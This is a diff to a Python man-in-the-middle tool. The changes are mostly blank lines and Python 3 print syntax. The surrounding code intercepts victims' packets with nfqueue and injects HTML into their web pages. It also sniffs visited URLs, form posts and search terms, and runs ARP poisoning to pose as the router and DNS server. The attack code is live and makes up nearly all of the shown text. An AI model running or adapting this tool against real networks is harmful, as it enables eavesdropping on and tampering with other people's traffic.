@@ -124,6 +124,7 @@ class Parser():
 		IP_layer = pkt[IP]
 		IP_dst = pkt[IP].dst
 		IP_src = pkt[IP].src
+
 		if args.urlspy or args.post or args.beef or args.code:
 			if pkt.haslayer(Raw):
 				if pkt.haslayer(TCP):
@@ -182,6 +183,7 @@ class Parser():
 			get = self.get_get(header_lines)
 			host = self.get_host(header_lines)
 			self.html_url = self.get_url(host, get, post)
+		
 			if self.html_url:
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
 				if any(i in self.html_url for i in d):
@@ -191,7 +193,9 @@ class Parser():
 			else:
 				payload.set_verdict(nfqueue.NF_ACCEPT)
 				return
+		
 			self.user_agent = "'"+self.get_user_agent(header_lines)+"'"
+		
 			if not self.user_agent:
 				# Most common user-agent on the internet
 				self.user_agent = "'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'"
@@ -264,7 +268,7 @@ class Parser():
 							del pkt[TCP].chksum
 							payload.set_verdict(nfqueue.NF_DROP)
 							send(pkt)
-							print '[-] Could not recompress html, sent packet as is'
+							print('[-] Could not recompress html, sent packet as is')
 							self.html_url = None
 							return
 						except:
@@ -276,9 +280,10 @@ class Parser():
 			pkt[IP].len = len(str(pkt))
 			del pkt[IP].chksum
 			del pkt[TCP].chksum
+		
 			try:
 				send(pkt)
-				print R+'[!] Injected HTML into packet for '+W+self.html_url
+				print(R+'[!] Injected HTML into packet for '+W+self.html_url)
 				logger.write('[!] Injected HTML into packet for '+self.html_url)
 				self.block_acks.append(ack)
 				payload.set_verdict(nfqueue.NF_DROP)
@@ -286,7 +291,7 @@ class Parser():
 			except:
 				payload.set_verdict(nfqueue.NF_ACCEPT)
 				self.html_url = None
-				print '[-] Failed to inject packet'
+				print('[-] Failed to inject packet')
 				return
 
 			if len(self.block_acks) > 30:
@@ -295,6 +300,7 @@ class Parser():
 	def get_host(self, header_lines):
 		for l in header_lines:
 			searchHost = re.search('[Hh]ost: ', l)
+			
 			if searchHost:
 				try:
 					return l.split('Host: ', 1)[1]
@@ -307,6 +313,7 @@ class Parser():
 	def get_get(self, header_lines):
 		for l in header_lines:
 			searchGet = re.search('GET /', l)
+			
 			if searchGet:
 				try:
 					return l.split('GET ')[1].split(' ')[0]
@@ -316,6 +323,7 @@ class Parser():
 	def get_post(self, header_lines):
 		for l in header_lines:
 			searchPost = re.search('POST /', l)
+			
 			if searchPost:
 				try:
 					return l.split(' ')[1].split(' ')[0]
@@ -324,6 +332,7 @@ class Parser():
 
 	def get_url(self, host, get, post):
 		if host:
+			
 			if post:
 				return host+post
 			if get:
@@ -335,11 +344,14 @@ class Parser():
 	def searches(self, url, host):
 		# search, query, search?q, ?s, &q, ?q, search?p, searchTerm, keywords, command
 		searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
+		
 		if searched:
 			searched = searched.group(3)
 			# Common false positives
+			
 			if 'select%20*%20from' in searched:
 				pass
+			
 			if host == 'geo.yahoo.com':
 				pass
 			else:
@@ -1014,7 +1026,7 @@ def main():
 		exit(0)
 	signal.signal(signal.SIGINT, signal_handler)
 
-	while 1:
+	while True:
 		# If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
 		if not dnsIP == routerIP and dnsMAC:
 			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
